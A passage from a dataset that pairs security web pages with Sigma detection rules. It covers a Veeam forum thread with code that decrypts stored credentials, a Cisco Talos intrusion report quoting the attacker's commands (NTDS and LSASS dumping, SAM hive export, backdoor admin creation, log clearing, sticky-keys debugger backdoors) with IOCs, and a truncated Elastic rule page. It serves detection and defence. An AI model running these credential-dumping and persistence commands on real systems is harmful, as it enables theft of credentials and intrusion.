02067079 or escalate the ticket to the higher tier. Thanks.\n\n---\n\n## mcz (Veeam Legend)\n\n**Posts:** 937\n**Joined:** Jul 19, 2016 8:39 am\n\n### Re: Recover ESXi password in Veeam\n\n+1 for sharing used API's with us\n\n---\n\n## vveeaamm (Lurker)\n\n**Posts:** 1\n**Joined:** Mar 22, 2019 10:04 am\n\n### Re: Recover ESXi password in Veeam\n\nHere is a quick .NET code to recover the pass:\n\n```\nusing System;\nusing System.Collections.Generic;\nusing System.Security.Cryptography;\nusing System.Text;\n\nnamespace Main\n{\n    internal static class Program\n    {\n        private static void Main(string[] args)\n        {\n            string encrypted = \"<pass_from_dbo.Credentials>\";\n            if (string.IsNullOrEmpty(encrypted))\n            {\n                return;\n            }\n            byte[] encryptedData = Convert.FromBase64String(encrypted);\n            Console.WriteLine(Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.LocalMachine)));\n        }\n    }\n}\n```\n\n---\n\n## ialvarez (Lurker)\n\n**Posts:** 1\n**Joined:** May 30, 2019 9:41 pm\n\n### Re: Recover ESXi password in Veeam\n\nConnect to SQL management studio and to the db for Veeam.\n\nRun this query:\n\n```\nSELECT TOP (1000) [id], [user_name], [password], [usn], [description], [visible], [change_time_utc]\nFROM [VeeamBackup].[dbo].[Credentials]\n```\n\nGet the password hash from the results (match the description to the one you need) then run this in PowerShell on the server running the db/Veeam service the BR server with the hash you grabbed.\n\n```\nAdd-Type -Path \"C:\\Program Files\\Veeam\\Backup and Replication\\Backup\\Veeam.Backup.Common.dll\"\n$encoded = 'hashed string from above'\n[Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded)\n```\n\n---\n\n## vcocaud (Service Provider)\n\n**Posts:** 2\n**Joined:** Sep 03, 2013 4:50 pm\n\n### Re: Recover ESXi password in Veeam\n\nI tried to use ialvarez method but getting this error (English translation = \"invalid data\"):\n\n```\nPS C:\\Users\\Administrateur> [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded)\nException lors de l'appel de « GetLocalString » avec « 1 » argument(s) : « Données non valides. »\n```\n\nI'm trying to recover a backup encryption password, is it possible with this method or another one?\n\n---\n\n## mcz (Veeam Legend)\n\n**Posts:** 937\n**Joined:** Jul 19, 2016 8:39 am\n\n### Re: Recover ESXi password in Veeam\n\nCan you share a screenshot with us?\n\n---\n\n## Moebius (Veeam ProPartner)\n\n**Posts:** 206\n**Joined:** Jun 09, 2009 2:48 pm\n\n### Re: Recover ESXi password in Veeam\n\nThis has been working great for me! Also working in v10. Thank you!\n\n---\n\n## daesiku (Novice)\n\n**Posts:** 6\n**Joined:** Nov 20, 2019 4:29 am\n\n### Re: Recover ESXi password in Veeam\n\nThis worked perfectly for my needs. It also serves to emphasize how important it is to secure your backup infrastructure.\n\n---\n\n## xavierpitz (Lurker)\n\n**Posts:** 2\n**Joined:** Sep 30, 2021 3:24 pm\n\n### Re: Recover ESXi password in Veeam\n\nThank you very much for this trick.\nI was able to retrieve/resurrect a private SSH key from table `dbo.Ssh_creds` with the same method and decrypting `private_key`/`passphrase` strings.\n\n```\nSELECT TOP (1000) [id], [elevatetoroot], [rootpassword], [private_key], [passphrase]\nFROM [Veeam].[dbo].[Ssh_creds]\n```\n\n---\n\n## tiiash (Lurker)\n\n**Posts:** 2\n**Joined:** Feb 04, 2021 5:25 pm\n\n### Re: Recover ESXi password in Veeam\n\nFor what it's worth, I experienced the same error message today. As a penetration tester, I am probably not the main audience of this forum 😉 but I figured this might be relevant for backup administrators as well. I understand that the decryption needs to be run on the same system that stores the encrypted passwords due to the data being tied to the local machine key. However, it seems that there can be situations in which the described process does not work as expected.\n\nSince the Veeam backups are running happily every day, there must be some way to decrypt the data successfully.\n\n---\n\n## Gostev (Chief Product Officer)\n\n**Posts:** 31700\n**Joined:** Jan 01, 2006 1:01 am\n\n### Re: Recover ESXi password in Veeam\n\nPlease note that this thread is about recovering credentials specifically. No one ever said the same approach can be used for other encrypted entities, such as backup encryption passwords the person you're quoting is trying to recover.\n\nOther than that, you are definitely an integral part of the main audience. Remember these are Veeam R&D forums and so we're particularly interested in opinions and findings of highly specialized professionals like yourself. Definitely way more than in \"something broke in my environment yesterday and backups are no longer working, help!\" type of posters 😉\n\n---\n\n## tiiash (Lurker)\n\n**Posts:** 2\n**Joined:** Feb 04, 2021 5:25 pm\n\n### Re: Recover ESXi password in Veeam\n\nThanks Gostev, I just found your reply and now activated email notifications for this topic 😉.\n\nYou are right that the user vcocaud, who I quoted, tried to decrypt backup encryption passwords. For me, the same error message occurred when trying to decrypt credentials which I retrieved from a Veeam backup server instance.\n\nThe approach described in this topic has already helped me multiple times in escalating privileges in a client environment and ultimately, in showing them why it is dangerous to connect your backup infrastructure to your production domain. If this happens, I always link them to your great best practice guide:\nhttps://bp.veeam.com/vbr/Security/Security_domains.html",
    "sigma_rule": {
      "title": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
      "id": "b57ba453-b384-4ab9-9f40-1038086b4e53",
      "status": "test",
      "description": "Detects dump of credentials in VeeamBackup dbo",
      "references": [
        "https://thedfirreport.com/2021/12/13/diavol-ransomware/",
        "https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html"
      ],
      "author": "frack113",
      "date": "2021-12-20",
      "modified": "2023-02-13",
      "tags": [
        "attack.collection",
        "attack.t1005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools": {
          "Image|endswith": "\\sqlcmd.exe"
        },
        "selection_query": {
          "CommandLine|contains|all": [
            "SELECT",
            "TOP",
            "[VeeamBackup].[dbo].[Credentials]"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sqlcmd_veeam_dump.yml",
    "id": "500"
  },
  {
    "url": "https://blog.talosintelligence.com/recent-cyber-attack",
    "markdown": "# Cisco Talos shares insights related to recent cyber attack on Cisco\n\n_By Nick Biasini_\n**Wednesday, August 10, 2022 15:30**\n**Category:** Headlines\n\n---\n\n### THIS POST IS ALSO AVAILABLE IN:\n日本語 (Japanese)\n\n---\n\n## Update History\n\n| Date             | Description of Updates                                                                 |\n|------------------|----------------------------------------------------------------------------------------|\n| Aug. 10th 2022   | Adding clarifying details on activity involving active directory.                      |\n| Aug. 10th 2022   | Update made to the Cisco Response and Recommendations section related to MFA.          |\n\n---\n\n## Executive summary\n\n- On May 24, 2022, Cisco became aware of a potential compromise. Since that point, Cisco Security Incident Response (CSIRT) and Cisco Talos have been working to remediate.\n- During the investigation, it was determined that a Cisco employee’s credentials were compromised after an attacker gained control of a personal Google account where credentials saved in the victim’s browser were being synchronized.\n- The attacker conducted a series of sophisticated voice phishing attacks under the guise of various trusted organizations attempting to convince the victim to accept multi-factor authentication (MFA) push notifications initiated by the attacker. The attacker ultimately succeeded in achieving an MFA push acceptance, granting them access to VPN in the context of the targeted user.\n- CSIRT and Talos are responding to the event and we have not identified any evidence suggesting that the attacker gained access to critical internal systems, such as those related to product development, code signing, etc.\n- After obtaining initial access, the threat actor conducted a variety of activities to maintain access, minimize forensic artifacts, and increase their level of access to systems within the environment.\n- The threat actor was successfully removed from the environment and displayed persistence, repeatedly attempting to regain access in the weeks following the attack; however, these attempts were unsuccessful.\n- We assess with moderate to high confidence that this attack was conducted by an adversary that has been previously identified as an initial access broker (IAB) with ties to the UNC2447 cybercrime gang, Lapsus$ threat actor group, and Yanluowang ransomware operators.\n- For further information see the Cisco Response page here.\n\n---\n\n## Initial vector\n\nInitial access to the Cisco VPN was achieved via the successful compromise of a Cisco employee’s personal Google account. The user had enabled password syncing via Google Chrome and had stored their Cisco credentials in their browser, enabling that information to synchronize to their Google account. After obtaining the user’s credentials, the attacker attempted to bypass multifactor authentication (MFA) using a variety of techniques, including voice phishing (aka \"vishing\") and MFA fatigue.\n\nOnce the attacker had obtained initial access, they enrolled a series of new devices for MFA and authenticated successfully to the Cisco VPN. The attacker then escalated to administrative privileges, allowing them to login to multiple systems, which alerted our Cisco Security Incident Response Team (CSIRT), who subsequently responded to the incident. The actor in question dropped a variety of tools, including remote access tools like LogMeIn and TeamViewer, offensive security tools such as Cobalt Strike, PowerSploit, Mimikatz, and Impacket, and added their own backdoor accounts and persistence mechanisms.\n\n---\n\n## Post-compromise TTPs\n\nFollowing initial access to the environment, the threat actor conducted a variety of activities for the purposes of maintaining access, minimizing forensic artifacts, and increasing their level of access to systems within the environment.\n\nOnce on a system, the threat actor began to enumerate the environment, using common built-in Windows utilities to identify the user and group membership configuration of the system, hostname, and identify the context of the user account under which they were operating. We periodically observed the attacker issuing commands containing typographical errors, indicating manual operator interaction was occurring within the environment.\n\nAfter establishing access to the VPN, the attacker then began to use the compromised user account to logon to a large number of systems before beginning to pivot further into the environment. They moved into the Citrix environment, compromising a series of Citrix servers and eventually obtained privileged access to domain controllers.\n\nAfter obtaining access to the domain controllers, the attacker began attempting to dump NTDS from them using “ntdsutil.exe” consistent with the following syntax:\n\n```\npowershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\users\\public' q q\n```\n\nThey then worked to exfiltrate the dumped NTDS over SMB (TCP/445) from the domain controller to the VPN system under their control.\n\nAfter obtaining access to credential databases, the attacker was observed leveraging machine accounts for privileged authentication and lateral movement across the environment.\n\nConsistent with activity we previously observed in other separate but similar attacks, the adversary created an administrative user called “z” on the system using the built-in Windows “net.exe” commands. This account was then added to the local Administrators group. We also observed instances where the threat actor changed the password of existing local user accounts to the same value shown below. Notably, we have observed the creation of the “z” account by this actor in previous engagements prior to the Russian invasion of Ukraine.\n\n```\nC:\\Windows\\system32\\net user z Lh199211* /add\nC:\\Windows\\system32\\net localgroup administrators z /add\n```\n\nThis account was then used in some cases to execute additional utilities, such as adfind or secretsdump, to attempt to enumerate the directory services environment and obtain additional credentials. Additionally, the threat actor was observed attempting to extract registry information, including the SAM database on compromised windows hosts.\n\n```\nreg save hklm\\system system\nreg save hklm\\sam sam\nreg save HKLM\\security sec\n```\n\nOn some systems, the attacker was observed employing MiniDump from Mimikatz to dump LSASS.\n\n```\ntasklist | findstr lsass\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\windows\\temp\\lsass.dmp full\n```\n\nThe attacker also took steps to remove evidence of activities performed on compromised systems by deleting the previously created local Administrator account. They also used the “wevtutil.exe” utility to identify and clear event logs generated on the system.\n\n```\nwevtutil.exe el\nwevtutil.exe cl [LOGNAME]\n```\n\nIn many cases, we observed the attacker removing the previously created local administrator account.\n\n```\nnet user z /delete\n```\n\nTo move files between systems within the environment, the threat actor often leveraged Remote Desktop Protocol (RDP) and Citrix. We observed them modifying the host-based firewall configurations to enable RDP access to systems.\n\n```\nnetsh advfirewall firewall set rule group=remote desktop new enable=Yes\n```\n\nWe also observed the installation of additional remote access tools, such as TeamViewer and LogMeIn.\n\n```\nC:\\Windows\\System32\\msiexec.exe /i C:\\Users\\[USERNAME]\\Pictures\\LogMeIn.msi\n```\n\nThe attacker frequently leveraged Windows logon bypass techniques to maintain the ability to access systems in the environment with elevated privileges. They frequently relied upon PSEXESVC.exe to remotely add the following Registry key values:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f\n```\n\nThis enabled the attacker to leverage the accessibility features present on the Windows logon screen to spawn a SYSTEM level command prompt, granting them complete control of the systems. In several cases, we observed the attacker adding these keys but not further interacting with the system, possibly as a persistence mechanism to be used later as their primary privileged access is revoked.\n\nThroughout the attack, we observed attempts to exfiltrate information from the environment. We confirmed that the only successful data exfiltration that occurred during the attack included the contents of a Box folder that was associated with a compromised employee’s account and employee authentication data from active directory. The Box data obtained by the adversary in this case was not sensitive.\n\nIn the weeks following the eviction of the attacker from the environment, we observed continuous attempts to re-establish access. In most cases, the attacker was observed targeting weak password rotation hygiene following mandated employee password resets. They primarily targeted users who they believed would have made single character changes to their previous passwords, attempting to leverage these credentials to authenticate and regain access to the Cisco VPN. The attacker was initially leveraging traffic anonymization services like Tor; however, after experiencing limited success, they switched to attempting to establish new VPN sessions from residential IP space using accounts previously compromised during the initial stages of the attack. We also observed the registration of several additional domains referencing the organization while responding to the attack and took action on them before they could be used for malicious purposes.\n\nAfter being successfully removed from the environment, the adversary also repeatedly attempted to establish email communications with executive members of the organization but did not make any specific threats or extortion demands. In one email, they included a screenshot showing the directory listing of the Box data that was previously exfiltrated as described earlier. Below is a screenshot of one of the received emails. The adversary redacted the directory listing screenshot prior to sending the email.\n\n---\n\n## Backdoor analysis\n\nThe actor dropped a series of payloads onto systems, which we continue to analyze. The first payload is a simple backdoor that takes commands from a command and control (C2) server and executes them on the end system via the Windows Command Processor. The commands are sent in JSON blobs and are standard for a backdoor. There is a “DELETE_SELF” command that removes the backdoor from the system completely. Another, more interesting, command, “WIPE”, instructs the backdoor to remove the last executed command from memory, likely with the intent of negatively impacting forensic analysis on any impacted hosts.\n\nCommands are retrieved by making HTTP GET requests to the C2 server using the following structure:\n\n```\n/bot/cmd.php?botid=%.8x\n```\n\nThe malware also communicates with the C2 server via HTTP GET requests that feature the following structure:\n\n```\n/bot/gate.php?botid=%.8x\n```\n\nFollowing the initial request from the infected system, the C2 server responds with a SHA256 hash. We observed additional requests made every 10 seconds.\n\nThe aforementioned HTTP requests are sent using the following user-agent string:\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36 Trailer/95.3.1132.33\n```\n\nThe malware also creates a file called “bdata.ini” in the malware’s current working directory that contains a value derived from the volume serial number present on the infected system. In instances where this backdoor was executed, the malware was observed running from the following directory location:\n\n```\nC:\\users\\public\\win\\cmd.exe\n```\n\nThe attacker was frequently observed staging tooling in directory locations under the Public user profile on systems from which they were operating.\n\nBased upon analysis of C2 infrastructure associated with this backdoor, we assess that the C2 server was set up specifically for this attack.\n\n---\n\n## Attack attribution\n\nBased upon artifacts obtained, tactics, techniques, and procedures (TTPs) identified, infrastructure used, and a thorough analysis of the backdoor utilized in this attack, we assess with moderate to high confidence that this attack was conducted by an adversary that has been previously identified as an initial access broker (IAB) with ties to both UNC2447 and Lapsus$. IABs typically attempt to obtain privileged access to corporate network environments and then monetize that access by selling it to other threat actors who can then leverage it for a variety of purposes. We have also observed previous activity linking this threat actor to the Yanluowang ransomware gang, including the use of the Yanluowang data leak site for posting data stolen from compromised organizations.\n\nUNC2447 is a financially-motivated threat actor with a nexus to Russia that has been previously observed conducting ransomware attacks and leveraging a technique known as “double extortion,” in which data is exfiltrated prior to ransomware deployment in an attempt to coerce victims into paying ransom demands. Prior reporting indicates that UNC2447 has been observed operating a variety of ransomware, including FIVEHANDS, HELLOKITTY, and more.\n\nApart from UNC2447, some of the TTPs discovered during the course of our investigation match those of the Lapsus$. Lapsus$ is a threat actor group that is reported to have been responsible for several previous notable breaches of corporate environments. Several arrests of Lapsus$ members were reported earlier this year. Lapsus$ has been observed compromising corporate environments and attempting to exfiltrate sensitive information.\n\nWhile we did not observe ransomware deployment in this attack, the TTPs used were consistent with “pre-ransomware activity,” activity commonly observed leading up to the deployment of ransomware in victim environments. Many of the TTPs observed are consistent with activity observed by CTIR during previous engagements. Our analysis also suggests reuse of server-side infrastructure associated with these previous engagements as well. In previous engagements, we also did not observe deployment of ransomware in the victim environments.\n\n---\n\n## Cisco response and recommendations\n\nCisco implemented a company-wide password reset immediately upon learning of the incident. CTIR previously observed similar TTPs in numerous investigations since 2021. Our findings and subsequent security protections resulting from those customer engagements helped us slow and contain the attacker’s progression. We created two ClamAV signatures, which are listed below.\n\n- Win.Exploit.Kolobko-9950675-0\n- Win.Backdoor.Kolobko-9950676-0\n\nThreat actors commonly use social engineering techniques to compromise targets, and despite the frequency of such attacks, organizations continue to face challenges mitigating those threats. User education is paramount in thwarting such attacks, including making sure employees know the legitimate ways that support personnel will contact users so that employees can identify fraudulent attempts to obtain sensitive information.\n\nGiven the actor’s demonstrated proficiency in using a wide array of techniques to obtain initial access, user education is also a key part of countering MFA bypass techniques. Equally important to implementing MFA is ensuring that employees are educated on what to do and how to respond if they get errant push requests on their respective phones. It is also essential to educate employees about who to contact if such incidents do arise to help determine if the event was a technical issue or malicious.\n\nFor Duo it is beneficial to implement strong device verification by enforcing stricter controls around device status to limit or block enrollment and access from unmanaged or unknown devices. Additionally, leveraging risk detection to highlight events like a brand-new device being used from unrealistic location or attack patterns like logins brute force can help detect unauthorized access.\n\nPrior to allowing VPN connections from remote endpoints, ensure that posture checking is configured to enforce a baseline set of security controls. This ensures that the connecting devices match the security requirements present in the environment. This can also prevent rogue devices that have not been previously approved from connecting to the corporate network environment.\n\nNetwork segmentation is another important security control that organizations should employ, as it provides enhanced protection for high-value assets and also enables more effective detection and response capabilities in situations where an adversary is able to gain initial access into the environment.\n\nCentralized log collection can help minimize the lack of visibility that results when an attacker take active steps to remove logs from systems. Ensuring that the log data generated by endpoints is centrally collected and analyzed for anomalous or overtly malicious behavior can provide early indication when an attack is underway.\n\nIn many cases, threat actors have been observed targeting the backup infrastructure in an attempt to further remove an organization’s ability to recover following an attack. Ensuring that backups are offline and periodically tested can help mitigate this risk and ensure an organization’s ability to effectively recover following an attack.\n\nAuditing of command line execution on endpoints can also provide increased visibility into actions being performed on systems in the environment and can be used to detect suspicious execution of built-in Windows utilities, which is commonly observed during intrusions where threat actors rely on benign applications or utilities already present in the environment for enumeration, privilege escalation, and lateral movement activities.\n\n---\n\n## Mitre ATT&CK mapping\n\nAll of the previously described TTPs that were observed in this attack are listed below based on the phase of the attack in which they occurred.\n\n### Initial Access\n\n- ATT&CK Technique : Phishing (T1566)\n- ATT&CK Technique : Valid Accounts (T1078)\n\n### Execution\n\n- ATT&CK Technique : System Services: Service Execution (T1569.002)\n\n### Persistence\n\n- ATT&CK Technique : Create Account: Local Account (T1136.001)\n- ATT&CK Technique : Account Manipulation: Device Registration (T1098.005)\n\n### Privilege Escalation\n\n- ATT&CK Technique : Event Triggered Execution: Image File Execution Options Injection (T1546.012)\n\n### Defense Evasion\n\n- ATT&CK Technique : Indicator Removal on Host (T1070)\n- ATT&CK Technique : Indicator Removal on Host: Clear Windows Event Logs (T1070.001)\n- ATT&CK Technique : Masquerading: Match Legitimate Name or Location (T1036.005)\n- ATT&CK Technique : Impair Defenses: Disable or Modify System Firewall (T1562.004)\n- ATT&CK Technique : Modify Registry (T1112)\n\n### Credential Access\n\n- ATT&CK Technique : OS Credential Dumping: LSASS Memory (T1003.001)\n- ATT&CK Technique : OS Credential Dumping: Security Account Manager (T1003.002)\n- ATT&CK Technique : OS Credential Dumping: NTDS (T1003.003)\n- ATT&CK Technique : Multi-Factor Authentication Request Generation (T1621)\n\n### Lateral Movement\n\n- ATT&CK Technique : Remote Services (T1021)\n\n### Discovery\n\n- ATT&CK Technique : Query Registry (T1012)\n\n### Command and Control\n\n- ATT&CK Technique : Application Layer Protocol: Web Protocols (T1071.001)\n- ATT&CK Technique : Remote Access Software (T1219)\n- ATT&CK Technique: Encrypted Channel: Asymmetric Cryptography (T1573.002)\n- ATT&CK Technique : Proxy: Multi-hop Proxy (T1090.003)\n\n### Exfiltration\n\n- ATT&CK Technique : Exfiltration Over Alternative Protocol (T1048)\n\n---\n\n## Indicators of compromise\n\nThe following indicators of compromise were observed associated with this attack.\n\n### Hashes (SHA256)\n\n- 184a2570d71eedc3c77b63fd9d2a066cd025d20ceef0f75d428c6f7e5c6965f3\n- 2fc5bf9edcfa19d48e235315e8f571638c99a1220be867e24f3965328fe94a03\n- 542c9da985633d027317e9a226ee70b4f0742dcbc59dfd2d4e59977bb870058d\n- 61176a5756c7b953bc31e5a53580d640629980a344aa5ff147a20fb7d770b610\n- 753952aed395ea845c52e3037f19738cfc9a415070515de277e1a1baeff20647\n- 8df89eef51cdf43b2a992ade6ad998b267ebb5e61305aeb765e4232e66eaf79a\n- 8e5733484982d0833abbd9c73a05a667ec2d9d005bbf517b1c8cd4b1daf57190\n- 99be6e7e31f0a1d7eebd1e45ac3b9398384c1f0fa594565137abb14dc28c8a7f\n- bb62138d173de997b36e9b07c20b2ca13ea15e9e6cd75ea0e8162e0d3ded83b7\n- eb3452c64970f805f1448b78cd3c05d851d758421896edd5dfbe68e08e783d18\n\n### IP Addresses\n\n- 104.131.30[.]201\n- 108.191.224[.]47\n- 131.150.216[.]118\n- 134.209.88[.]140\n- 138.68.227[.]71\n- 139.177.192[.]145\n- 139.60.160[.]20\n- 139.60.161[.]99\n- 143.198.110[.]248\n- 143.198.131[.]210\n- 159.65.246[.]188\n- 161.35.137[.]163\n- 162.33.177[.]27\n- 162.33.178[.]244\n- 162.33.179[.]17\n- 165.227.219[.]211\n- 165.227.23[.]218\n- 165.232.154[.]73\n- 166.205.190[.]23\n- 167.99.160[.]91\n- 172.56.42[.]39\n- 172.58.220[.]52\n- 172.58.239[.]34\n- 174.205.239[.]164\n- 176.59.109[.]115\n- 178.128.171[.]206\n- 185.220.100[.]244\n- 185.220.101[.]10\n- 185.220.101[.]13\n- 185.220.101[.]15\n- 185.220.101[.]16\n- 185.220.101[.]2\n- 185.220.101[.]20\n- 185.220.101[.]34\n- 185.220.101[.]45\n- 185.220.101[.]6\n- 185.220.101[.]65\n- 185.220.101[.]73\n- 185.220.101[.]79\n- 185.220.102[.]242\n- 185.220.102[.]250\n- 192.241.133[.]130\n- 194.165.16[.]98\n- 195.149.87[.]136\n- 24.6.144[.]43\n- 45.145.67[.]170\n- 45.227.255[.]215\n- 45.32.141[.]138\n- 45.32.228[.]189\n- 45.32.228[.]190\n- 45.55.36[.]143\n- 45.61.136[.]207\n- 45.61.136[.]5\n- 45.61.136[.]83\n- 46.161.27[.]117\n- 5.165.200[.]7\n- 52.154.0[.]241\n- 64.227.0[.]177\n- 64.4.238[.]56\n- 65.188.102[.]43\n- 66.42.97[.]210\n- 67.171.114[.]251\n- 68.183.200[.]63\n- 68.46.232[.]60\n- 73.153.192[.]98\n- 74.119.194[.]203\n- 74.119.194[.]4\n- 76.22.236[.]142\n- 82.116.32[.]77\n- 87.251.67[.]41\n- 94.142.241[.]194\n\n### Domains\n\n- cisco-help[.]cf\n- cisco-helpdesk[.]cf\n- ciscovpn1[.]com\n- ciscovpn2[.]com\n- ciscovpn3[.]com\n- devcisco[.]com\n- devciscoprograms[.]com\n- helpzonecisco[.]com\n- kazaboldu[.]net\n- mycisco[.]cf\n- mycisco[.]gq\n- mycisco-helpdesk[.]ml\n- primecisco[.]com\n- pwresetcisco[.]com\n\n### Email Addresses\n\n- costacancordia[@]protonmail[.]com",
    "sigma_rule": {
      "title": "User Added to Local Administrators Group",
      "id": "ad720b90-25ad-43ff-9b5e-5c841facc8e5",
      "related": [
        {
          "id": "ffa28e60-bdb1-46e0-9f82-05f7a61cc06e",
          "type": "similar"
        },
        {
          "id": "10fb649c-3600-4d37-b1e6-56ea90bb7e09",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".",
      "references": [
        "https://blog.talosintelligence.com/recent-cyber-attack"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-12",
      "modified": "2023-03-02",
      "tags": [
        "attack.persistence",
        "attack.t1098"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": [
          {
            "CommandLine|contains|all": [
              "localgroup ",
              " /add"
            ]
          },
          {
            "CommandLine|contains|all": [
              "Add-LocalGroupMember ",
              " -Group "
            ]
          }
        ],
        "selection_group": {
          "CommandLine|contains": [
            " administrators ",
            " administrateur"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_add_user_local_admin_group.yml",
    "id": "510"
  },
  {
    "url": "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
    "markdown": "",
    "sigma_rule": {
      "title": "Copy From Or To Admin Share Or Sysvol Folder",
      "id": "855bc8b5-2ae8-402e-a9ed-b889e6df1900",
      "status": "test",
      "description": "Detects a copy command or a copy utility execution to or from an Admin share or remote",
      "references": [
        "https://twitter.com/SBousseaden/status/1211636381086339073",
        "https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view",
        "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali",
      "date": "2019-12-30",
      "modified": "2023-11-15",
      "tags": [
        "attack.lateral-movement",
        "attack.collection",
        "attack.exfiltration",
        "attack.t1039",
        "attack.t1048",
        "attack.t1021.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_target": {
          "CommandLine|contains": [
            "\\\\\\\\*$",
            "\\Sysvol\\"
          ]
        },
        "selection_other_tools": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_cmd_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cmd_cli": {
          "CommandLine|contains": "copy"
        },
        "selection_pwsh_img": [
          {
            "Image|contains": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_pwsh_cli": {
          "CommandLine|contains": [
            "copy-item",
            "copy ",
            "cpi ",
            " cp ",
            "move ",
            "move-item",
            " mi ",
            " mv "
          ]
        },
        "condition": "selection_target and (selection_other_tools or all of selection_cmd_* or all of selection_pwsh_*)"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_lateral_movement.yml",
    "id": "516"
  },
  {
    "url": "https://www.elastic.co/guide/en/security/current/remote-file-copy-to-a-hidden-share.html",
    "markdown": "# Remote File Copy to a Hidden Share\n\nIdentifies a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity.\n\n**Rule type**: eql\n\n**Rule indices**:\n- endgame-*\n- logs-crowdstrike.fdr*\n- logs-endpoint.events.process-*\n- logs-m365_defender.event-*\n- logs-sentinel_one_cloud_funnel.*\n- logs-system.security*\n- logs-windows.forwarded*\n- logs-windows.sysmon_operational-*\n- winlogbeat-*\n\n**Severity**: medium\n\n**Risk score**: 47\n\n**Runs every**: 5m\n\n**Searches indices from**: now-9m (Date Math format, see also Additional look-back time)\n\n**Maximum alerts per execution**: 100\n\n**References**:\n- https://www.elastic.co/security-labs/hunting-for-lateral-movement-using-event-query-language\n\n**Tags**:\n- Domain: Endpoint\n- OS: Windows\n- Use Case: Threat Detection\n- Tactic: Lateral Movement\n- Data Source: Elastic Endgame\n- Data Source: Elastic Defend\n- Data Source: Windows Security Event Logs\n- Data Source: Microsoft Defender for Endpoint\n- Data Source: Sysmon\n- Data Source: SentinelOne\n- Data Source: Crowdstrike\n- Resources: Investigation Guide\n\n**Version**: 314\n\n**Rule authors**:\n- Elastic\n\n**Rule license**: Elastic License v2\n\n## Investigation guide\n\n**Triage and analysis**\n\n> **Disclaimer**: This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.\n\n**Investigating Remote File Copy to a Hidden Share**\n\nIn Windows environments, hidden network shares are often used for legitimate administrative tasks, allowing file transfers without user visibility. However, adversaries can exploit these shares for lateral movement or data exfiltration. The detection rule identifies suspicious file copy attempts using common command-line tools like `cmd.exe` and `powershell.exe`, focusing on hidden share patterns to flag potential threats.\n\n**Possible investigation steps**\n- Review the process details to identify the specific command-line tool used (`cmd.exe`, `powershell.exe`, `xcopy.exe`, or `robocopy.exe`) and examine the arguments to understand the nature of the file copy operation.\n- Investigate the source and destination of the file copy by analyzing the network share path in the process arguments, focusing on the hidden share pattern (e.g., `\\\\*$`).\n- Check the user account associated with the process to determine if it has legitimate access to the hidden share and assess if the activity aligns with the user’s typical behavior.\n- Correlate the event with other logs or alerts from the same host or user to identify any additional suspicious activities, such as unusual login attempts or privilege escalation.\n- Examine the historical activity of the involved host to identify any previous instances of similar file copy attempts or other indicators of lateral movement.\n- Consult threat intelligence sources to determine if the detected pattern or tools are associated with known adversary techniques or campaigns.\n\n**False positive analysis**\n- Administrative tasks using hidden shares can trigger alerts. Regularly review and document legitimate administrative activities that involve file transfers to hidden shares.\n- Backup operations often use hidden shares for data storage. Identify and exclude backup processes by specifying known backup software and their typical command-line arguments.\n- Software deployment tools may utilize hidden shares for distributing updates. Create exceptions for recognized deployment tools by listing their process names and associated arguments.\n- IT maintenance scripts might copy files to hidden shares for system updates. Maintain a list of approved maintenance scripts and exclude them from triggering alerts.\n- User-initiated file transfers for legitimate purposes can be 